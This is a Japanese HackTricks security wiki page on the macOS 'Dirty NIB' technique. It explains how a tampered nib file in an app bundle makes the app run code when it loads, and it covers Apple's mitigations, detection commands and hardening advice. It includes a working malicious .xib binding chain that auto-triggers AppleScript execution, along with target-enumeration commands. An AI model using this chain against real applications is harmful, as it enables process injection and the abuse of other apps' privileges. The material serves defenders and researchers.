# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB は、署名済み macOS app bundle 内の Interface Builder files（.xib/.nib）を悪用し、攻撃者が制御する logic を target process 内で実行する手法です。これにより、その process の entitlements と TCC permissions を継承できます。この technique は、当初 xpn（MDSec）によって文書化され、その後 Sector7 によって一般化および大幅に拡張されました。Sector7 は、macOS 13 Ventura と macOS 14 Sonoma における Apple の mitigations についても解説しています。<sup>[[1]](#references)[[2]](#references)</sup> 背景と詳細については、末尾の references を参照してください。

> TL;DR
> • macOS 13 Ventura より前: bundle の MainMenu.nib（または startup 時に読み込まれる別の nib）を置き換えることで、process injection と、多くの場合 privilege escalation を確実に実現できました。
> • macOS 13（Ventura）以降、および macOS 14（Sonoma）での改善後: first-launch deep verification、bundle protection、Launch Constraints、新しい TCC の「App Management」permission により、無関係な app による post-launch nib tampering は大部分が防止されます。ただし、ニッチなケースでは攻撃が可能な場合があります（例: same-developer tooling による自社 app の変更、または user によって App Management/Full Disk Access が付与された terminal）。

## NIB/XIB files とは

Nib（NeXT Interface Builder の略）files は、AppKit apps が使用する serialized UI object graphs です。Modern Xcode は編集可能な XML .xib files を保存し、build 時に .nib に compile します。一般的な app は `NSApplicationMain()` を使用して main UI を読み込み、app の Info.plist にある `NSMainNibFile` key を読み取って、runtime 時に object graph を instantiate します。

この attack を可能にする主なポイント:
- NIB loading は、NSSecureCoding に準拠していない任意の Objective-C classes を instantiate します（`initWithCoder:` が利用できない場合、Apple の nib loader は `init`/`initWithFrame:` に fallback します）。
- Cocoa Bindings を悪用すると、nib の instantiate 中に methods を call できます。これには user interaction を必要としない chained calls も含まれます。


## Dirty NIB injection process（attacker view）

classic な pre-Ventura flow:
1) malicious .xib を作成
- `NSAppleScript` object（または `NSTask` などの別の「gadget」classes）を追加します。
- payload（例: AppleScript または command arguments）を title に含む `NSTextField` を追加します。
- bindings を介して target object の methods を call するよう wired された `NSMenuItem` objects を 1 つ以上追加します。

2) user clicks なしで auto-trigger
- bindings を使用して menu item の target/selector を設定し、private な `_corePerformAction` method を invoke します。これにより、nib の load 時に action が自動的に実行されます。button を user が click する必要がなくなります。

.xib 内の auto-trigger chain の最小例（明確化のため省略）:
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
これにより、nib の読み込み時に対象プロセス内で任意の AppleScript 実行が可能になります。<sup>[[1]](#references)</sup> 高度な chain では、次のことが可能です。
- 任意の AppKit class（例: `NSTask`）を instantiate し、`-launch` のような引数なしの method を call する。
- 上記の binding trick を介して、object 引数付きで任意の selector を call する。
- AppleScriptObjC.framework を load して Objective-C への bridge を構築し、選択した C API も call する。
- Python.framework がまだ含まれている古いシステムでは、Python への bridge を構築し、`ctypes` を使用して任意の C function を call する（Sector7 の research）。<sup>[[2]](#references)</sup>

3) app の nib を replace する
- target.app を writable location に copy し、例えば `Contents/Resources/MainMenu.nib` を malicious nib に replace して、target.app を run する。Ventura より前では、初回の Gatekeeper assessment の後、以降の launch では shallow signature check のみが実行されるため、.nib のような non-executable resource は再検証されませんでした。

visible test 用の AppleScript payload の例:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Appleは、Modern macOSにおけるDirty NIBの実用性を大幅に低下させる、いくつかのsystemicな緩和策を導入しました:<sup>[[2]](#references)</sup>
- First-launch deep verificationとbundle protection（macOS 13 Ventura）
- quarantineされているかどうかにかかわらず、あらゆるappの初回実行時に、deep signature checkによってすべてのbundle resourcesが検査されます。その後、bundleはprotectedになります。同じdeveloperのapp（またはappによって明示的に許可されたapp）だけが、その内容を変更できます。他のappが別のappのbundleに書き込むには、新しいTCCの「App Management」permissionが必要です。
- Launch Constraints（macOS 13 Ventura）
- System/Apple-bundled appsは別の場所にcopyして起動できません。これにより、OS appsを「/tmpにcopyし、patchして実行する」方法は使えなくなります。
- macOS 14 Sonomaでのimprovements
- AppleはApp Managementを強化し、Sector7が指摘した既知のbypasses（例: CVE‑2023‑40450）を修正しました。Python.frameworkはそれ以前（macOS 12.3）に削除されており、一部のprivilege-escalation chainsが機能しなくなっています。
- Gatekeeper/Quarantine changes
- このtechniqueに影響を与えたGatekeeper、provenance、assessment changesについてのより広範な説明は、以下で参照されているpageを確認してください。

> Practical implication
> • Ventura+では、通常、processにApp Managementがあるか、targetと同じTeam IDでsignedされている場合（例: developer tooling）を除き、third-party appの.nibを変更できません。
> • shells/terminalsにApp ManagementまたはFull Disk Accessをgrantすると、そのterminalのcontext内でcodeをexecuteできるあらゆるものに対して、このattack surfaceが実質的に再び開かれます。


### Addressing Launch Constraints

Launch Constraintsは、Ventura以降、多くのApple appsをnon-default locationsから実行することをblockします。Apple appをtemporary directoryにcopyし、`MainMenu.nib`をmodifyしてlaunchするなど、pre-Venturaのworkflowに依存していた場合、>= 13.0では失敗すると考えてください。


## Enumerating targets and nibs (useful for research / legacy systems)

- UIがnib-drivenであるappsを探す:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- bundle 内で候補となる nib リソースを見つける:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- code signatureを厳密に検証する（リソースを改ざんして再署名していない場合は失敗する）：
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 注: 最新の macOS では、適切な認証なしに別の app の bundle へ書き込もうとすると、bundle protection/TCC によってブロックされます。


## Detection and DFIR tips

- bundle resources のファイル整合性監視
- インストール済み app の `Contents/Resources/*.nib` や、その他の非実行リソースに対する mtime/ctime の変更を監視します。
- Unified logs とプロセスの挙動
- GUI app 内での予期しない AppleScript の実行、および AppleScriptObjC や Python.framework をロードするプロセスを監視します。例:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- 重要な app 全体に対して定期的に `codesign --verify --deep` を実行し、リソースが維持されていることを確認します。
- Privilege context
- TCC の「App Management」または Full Disk Access を持つユーザーやプロセスを監査します（特に terminal と管理 agent）。これらを汎用 shell から削除すると、Dirty NIB 型の tampering を簡単に再有効化されることを防止できます。


## Defensive hardening (developers and defenders)

- programmatic UI を優先するか、nib から instantiate されるものを制限します。強力な class（例: `NSTask`）を nib graph に含めないようにし、任意の object 上で selector を間接的に呼び出す bindings を避けます。
- Library Validation を有効にした hardened runtime を採用します（最新の app ではすでに標準です）。これは nib injection 自体を阻止するものではありませんが、容易な native code loading をブロックし、攻撃者を scripting のみの payload へと追い込みます。
- 汎用 tool で広範な App Management permissions を要求したり、依存したりしないでください。MDM が App Management を必要とする場合は、その context を user-driven shell から分離します。
- app bundle の整合性を定期的に検証し、update mechanism によって bundle resources が自動的に修復されるようにします。


## Related reading in HackTricks

この technique に影響する Gatekeeper、quarantine、provenance の変更について詳しく学びます:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (original write‑up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
